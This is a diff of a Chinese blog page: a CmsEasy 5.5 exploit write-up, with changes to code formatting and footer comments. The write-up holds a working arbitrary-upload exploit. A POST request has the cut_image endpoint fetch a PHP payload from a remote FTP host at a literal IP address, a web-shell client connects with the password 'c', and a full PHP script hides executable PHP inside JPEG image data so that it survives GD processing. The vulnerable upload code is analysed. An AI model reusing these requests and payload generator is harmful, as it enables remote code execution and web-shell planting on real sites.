@@ -658,17 +658,190 @@ http://45.32.74.108:8000/index.ph">
 <pre><code>http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_image</code></pre><p>post-data:</p>
 <pre><code>pic=1ftp://108.160.128.46/exp_eval_post_c_700x1120.php&amp;w=700&amp;h=1120&amp;x1=0&amp;x2=700&amp;y1=0&amp;y2=1120</code></pre><p>得到上传文件的地址，蚁剑连密码为c<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/42cf4c151b3de053.png" alt=""></p>
 <h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><p>利用脚本生成自己的图片payload</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$miniPayload =<span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $miniPayload;</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) {</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) {</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) {</span><br><span class="line">	$nullbytePayloadSize = $pad;</span><br><span class="line">	$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">	$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">	$extraBytes = <span class="number">0</span>;</span><br><span class="line">	$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) {</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) {</span><br><span class="line">		$marker = $dis-&gt;readByte();</span><br><span class="line">		$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">		$dis-&gt;skip($size);</span><br><span class="line">		<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) {</span><br><span class="line">			$startPos = $dis-&gt;seek();</span><br><span class="line">			$outStreamTmp = </span><br><span class="line">				substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">				$miniPayload . </span><br><span class="line">				str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">				substr($outStream, $startPos);</span><br><span class="line">			checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">			<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) {</span><br><span class="line">				<span class="keyword">while</span>((!$dis-&gt;eof())) {</span><br><span class="line">					<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) {</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) {</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						}</span><br><span class="line">					}</span><br><span class="line">				}</span><br><span class="line">				$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">				$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">				$outStream = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					substr(</span><br><span class="line">						str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">							substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">							substr($outStream, $stopPos);</span><br><span class="line">			} <span class="keyword">elseif</span>($correctImage) {</span><br><span class="line">				$outStream = $outStreamTmp;</span><br><span class="line">			} <span class="keyword">else</span> {</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">			<span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) {</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">			} <span class="keyword">else</span> {</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>{</span><br><span class="line">	<span class="keyword">global</span> $correctImage;</span><br><span class="line">	file_put_contents($filename, $data);</span><br><span class="line">	$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">	imagecreatefromjpeg($filename);</span><br><span class="line">	<span class="keyword">if</span>($unlink)</span><br><span class="line">		unlink($filename);</span><br><span class="line">	<span class="keyword">return</span> $correctImage;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>{</span><br><span class="line">	<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">	$correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) {</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) {</span><br><span class="line">			$extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>{</span><br><span class="line">	<span class="keyword">private</span> $binData;</span><br><span class="line">	<span class="keyword">private</span> $order;</span><br><span class="line">	<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>{</span><br><span class="line">		<span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">		<span class="keyword">if</span>(!$fromString) {</span><br><span class="line">			<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>{</span><br><span class="line">		<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>{</span><br><span class="line">		<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>{</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) {</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">		}</span><br><span class="line">		$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> ord($byte);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>{</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) {</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">		}</span><br><span class="line">		$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) {</span><br><span class="line">			$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">return</span> $short;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>{</span><br><span class="line">		<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code>&lt;?php
 
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞点在CmsEasy5.5/lib/default/tool_act.php 392行的cut_image_action()函数</p>
-<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cut_image_action</span><span class="params">()</span> </span>{</span><br><span class="line">    $len = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(config::get(<span class="string">'base_url'</span>) != <span class="string">'/'</span>){</span><br><span class="line">        $len = strlen(config::get(<span class="string">'base_url'</span>))+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(substr($_POST[<span class="string">'pic'</span>],<span class="number">0</span>,<span class="number">4</span>) == <span class="string">'http'</span>){</span><br><span class="line">        front::$post[<span class="string">'thumb'</span>] = str_ireplace(config::get(<span class="string">'site_url'</span>),<span class="string">''</span>,$_POST[<span class="string">'pic'</span>]);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        front::$post[<span class="string">'thumb'</span>] = substr($_POST[<span class="string">'pic'</span>],$len);</span><br><span class="line">    }</span><br><span class="line">    $thumb=<span class="keyword">new</span> thumb();</span><br><span class="line">    $thumb-&gt;set(front::$post[<span class="string">'thumb'</span>],<span class="string">'jpg'</span>);</span><br><span class="line">    $img=$thumb-&gt;create_image($thumb-&gt;im,$_POST[<span class="string">'w'</span>],$_POST[<span class="string">'h'</span>],<span class="number">0</span>,<span class="number">0</span>,$_POST[<span class="string">'x1'</span>],$_POST[<span class="string">'y1'</span>],$_POST[<span class="string">'x2'</span>] -$_POST[<span class="string">'x1'</span>],$_POST[<span class="string">'y2'</span>$new_name=$new_name_gbk=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,Time::getMicrotime()).<span class="string">'.'</span>.end(explode(<span class="string">'.'</span>,$_POST[<span class="string">'pic'</span>]));</span><br><span class="line">    $save_file=<span class="string">'upload/images/'</span>.date(<span class="string">'Ym'</span>).<span class="string">'/'</span>.$new_name;</span><br><span class="line">    @mkdir(dirname(ROOT.<span class="string">'/'</span>.$save_file));</span><br><span class="line">    ob_start();</span><br><span class="line">    $thumb-&gt;out_image($img,<span class="keyword">null</span>,<span class="number">85</span>);</span><br><span class="line">    file_put_contents(ROOT.<span class="string">'/'</span>.$save_file,ob_get_contents());</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    $image_url=config::get(<span class="string">'base_url'</span>).<span class="string">'/'</span>.$save_file;</span><br><span class="line">    <span class="comment">//$res['size']=ceil(strlen($img) / 1024);</span></span><br><span class="line">    $res[<span class="string">'code'</span>]=<span class="string">"</span></span><br><span class="line"><span class="string">                    //$('#cut_preview').attr('src','$image_url');</span></span><br><span class="line"><span class="string">                    $('#thumb').val('$image_url');</span></span><br><span class="line"><span class="string">                    alert(lang('save_success'));</span></span><br><span class="line"><span class="string">    "</span>;</span><br><span class="line">    <span class="keyword">echo</span> json::encode($res);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+$miniPayload ='&lt;?php phpinfo();?&gt;';
 
-<p>在这段代码里将上传的文件重新命名，没有对后缀进行限制，允许了php文件上传</p>
+print $miniPayload;
+if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+    die('php-gd is not installed');
+}
+
+if(!isset($argv[1])) {
+    die('php jpg_payload.php &lt;jpg_name.jpg&gt;');
+}
+
+set_error_handler("custom_error_handler");
+
+for($pad = 0; $pad &lt; 1024; $pad++) {
+    $nullbytePayloadSize = $pad;
+    $dis = new DataInputStream($argv[1]);
+    $outStream = file_get_contents($argv[1]);
+    $extraBytes = 0;
+    $correctImage = TRUE;
+
+    if($dis-&gt;readShort() != 0xFFD8) {
+        die('Incorrect SOI marker');
+    }
+
+    while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+        $marker = $dis-&gt;readByte();
+        $size = $dis-&gt;readShort() - 2;
+        $dis-&gt;skip($size);
+        if($marker === 0xDA) {
+            $startPos = $dis-&gt;seek();
+            $outStreamTmp = 
+                substr($outStream, 0, $startPos) . 
+                $miniPayload . 
+                str_repeat("\0",$nullbytePayloadSize) . 
+                substr($outStream, $startPos);
+            checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+            if($extraBytes !== 0) {
+                while((!$dis-&gt;eof())) {
+                    if($dis-&gt;readByte() === 0xFF) {
+                        if($dis-&gt;readByte !== 0x00) {
+                            break;
+                        }
+                    }
+                }
+                $stopPos = $dis-&gt;seek() - 2;
+                $imageStreamSize = $stopPos - $startPos;
+                $outStream = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    substr(
+                        str_repeat("\0",$nullbytePayloadSize).
+                            substr($outStream, $startPos, $imageStreamSize),
+                        0,
+                        $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                            substr($outStream, $stopPos);
+            } elseif($correctImage) {
+                $outStream = $outStreamTmp;
+            } else {
+                break;
+            }
+            if(checkImage('payload_'.$argv[1], $outStream)) {
+                die('Success!');
+            } else {
+                break;
+            }
+        }
+    }
+}
+unlink('payload_'.$argv[1]);
+die('Something\'s wrong');
+
+function checkImage($filename, $data, $unlink = FALSE) {
+    global $correctImage;
+    file_put_contents($filename, $data);
+    $correctImage = TRUE;
+    imagecreatefromjpeg($filename);
+    if($unlink)
+        unlink($filename);
+    return $correctImage;
+}
+
+function custom_error_handler($errno, $errstr, $errfile, $errline) {
+    global $extraBytes, $correctImage;
+    $correctImage = FALSE;
+    if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+        if(isset($m[1])) {
+            $extraBytes = (int)$m[1];
+        }
+    }
+}
+
+class DataInputStream {
+    private $binData;
+    private $order;
+    private $size;
+
+    public function __construct($filename, $order = false, $fromString = false) {
+        $this-&gt;binData = '';
+        $this-&gt;order = $order;
+        if(!$fromString) {
+            if(!file_exists($filename) || !is_file($filename))
+                die('File not exists ['.$filename.']');
+            $this-&gt;binData = file_get_contents($filename);
+        } else {
+            $this-&gt;binData = $filename;
+        }
+        $this-&gt;size = strlen($this-&gt;binData);
+    }
+
+    public function seek() {
+        return ($this-&gt;size - strlen($this-&gt;binData));
+    }
+
+    public function skip($skip) {
+        $this-&gt;binData = substr($this-&gt;binData, $skip);
+    }
+
+    public function readByte() {
+        if($this-&gt;eof()) {
+            die('End Of File');
+        }
+        $byte = substr($this-&gt;binData, 0, 1);
+        $this-&gt;binData = substr($this-&gt;binData, 1);
+        return ord($byte);
+    }
+
+    public function readShort() {
+        if(strlen($this-&gt;binData) &lt; 2) {
+            die('End Of File');
+        }
+        $short = substr($this-&gt;binData, 0, 2);
+        $this-&gt;binData = substr($this-&gt;binData, 2);
+        if($this-&gt;order) {
+            $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+        } else {
+            $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+        }
+        return $short;
+    }
+
+    public function eof() {
+        return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+    }
+}</code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞点在CmsEasy5.5/lib/default/tool_act.php 392行的cut_image_action()函数</p>
+<pre><code>function cut_image_action() {
+    $len = 1;
+    if(config::get('base_url') != '/'){
+        $len = strlen(config::get('base_url'))+1;
+    }
+    if(substr($_POST['pic'],0,4) == 'http'){
+        front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);
+    }else{
+        front::$post['thumb'] = substr($_POST['pic'],$len);
+    }
+    $thumb=new thumb();
+    $thumb-&gt;set(front::$post['thumb'],'jpg');
+    $img=$thumb-&gt;create_image($thumb-&gt;im,$_POST['w'],$_POST['h'],0,0,$_POST['x1'],$_POST['y1'],$_POST['x2'] -$_POST['x1'],$_POST['y2'$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));
+    $save_file='upload/images/'.date('Ym').'/'.$new_name;
+    @mkdir(dirname(ROOT.'/'.$save_file));
+    ob_start();
+    $thumb-&gt;out_image($img,null,85);
+    file_put_contents(ROOT.'/'.$save_file,ob_get_contents());
+    ob_end_clean();
+    $image_url=config::get('base_url').'/'.$save_file;
+    //$res['size']=ceil(strlen($img) / 1024);
+    $res['code']="
+                    //$('#cut_preview').attr('src','$image_url');
+                    $('#thumb').val('$image_url');
+                    alert(lang('save_success'));
+    ";
+    echo json::encode($res);
+}</code></pre><p>在这段代码里将上传的文件重新命名，没有对后缀进行限制，允许了php文件上传</p>
 <pre><code>\$new_name=\$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',\$_POST['pic']));</code></pre><p>因此需构造经php图像库处理后仍能保持shell语句，且通过file_exists函数的验证（php5.0后可以用ftp协议加载图片）</p>
 <p>这段代码决定图片的ftp地址前需要补位，若此时<code>pic=ftp://108.160.128.46/payload_image.php</code>,则<code>front::\$post['thumb'] = substr(\$_POST['pic'],$len)= substr(\$_POST['pic'],1)</code>,因此需要构造<code>pic=1ftp://108.160.128.46/payload_image.php</code>才能正好取到远程图片，相应地，站点不是放在根目录，则需要补位strlen(base_url)+2</p>
-<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config::get(<span class="string">'base_url'</span>) != <span class="string">'/'</span>){</span><br><span class="line">    $len = strlen(config::get(<span class="string">'base_url'</span>))+<span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(substr($_POST[<span class="string">'pic'</span>],<span class="number">0</span>,<span class="number">4</span>) == <span class="string">'http'</span>){</span><br><span class="line">    front::$post[<span class="string">'thumb'</span>] = str_ireplace(config::get(<span class="string">'site_url'</span>),<span class="string">''</span>,$_POST[<span class="string">'pic'</span>]);</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    front::$post[<span class="string">'thumb'</span>] = substr($_POST[<span class="string">'pic'</span>],$len);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<script>
+<pre><code>if(config::get('base_url') != '/'){
+    $len = strlen(config::get('base_url'))+1;
+}
+if(substr($_POST['pic'],0,4) == 'http'){
+    front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);
+}else{
+    front::$post['thumb'] = substr($_POST['pic'],$len);
+}</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1112,34 +1285,33 @@ $(function () {
             <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
         
 
-        <!-- 洪卫 shw2018 add 2019.08.28 -->
         <script type="text/javascript">
             var OriginTitile = document.title,
                 st;
             document.addEventListener("visibilitychange", function () {
-                document.hidden ? (document.title = "看不见我🙈~看不见我🙈~", clearTimeout(st)) : (document.title =
-                    "(๑•̀ㅂ•́) ✧被发现了～", st = setTimeout(function () {
+                document.hidden ? (document.title = "😠给爷回来~", clearTimeout(st)) : (document.title =
+                    "(๑•̀ㅂ•́) ✧你回来啦～", st = setTimeout(function () {
                         document.title = OriginTitile
                     }, 3e3))
             })
         </script>
 
-        <!-- 鼠标点击烟花爆炸效果  洪卫 shw2018 add 2019.09.09 -->
+        <!-- 鼠标点击烟花爆炸效果  -->
         
             <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 1; pointer-events: none;"></canvas>
             <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
             <script type="text/javascript" src="/js/fireworks.js"></script>
         
 
-        <!-- 背景雪花飘落特效洪卫 shw2018 add 2019.09.10 -->
+        <!-- 背景雪花飘落特效 -->
         
 
-        <!-- 鼠标点击文字特效 洪卫 shw2018 add 2019.09.10-->
+        <!-- 鼠标点击文字特效  -->
         
             <script src="/js/wenzi.js" type="text/javascript"></script>
         
 
-        <!-- 背景雪花飘落特效 洪卫 shw2018 add 2019.09.10 -->
+        <!-- 背景雪花飘落特效  -->
         
             <script type="text/javascript">
                 var windowWidth = $(window).width();
@@ -1149,7 +1321,7 @@ $(function () {
             </script>
         
 
-        <!-- 在线聊天工具  洪卫 shw2018 add 2019.09.11 -->
+        <!-- 在线聊天工具   -->
         
 
         <!-- 背景 canvas-nest  洪卫 shw 2018  add 2019.09.15-->
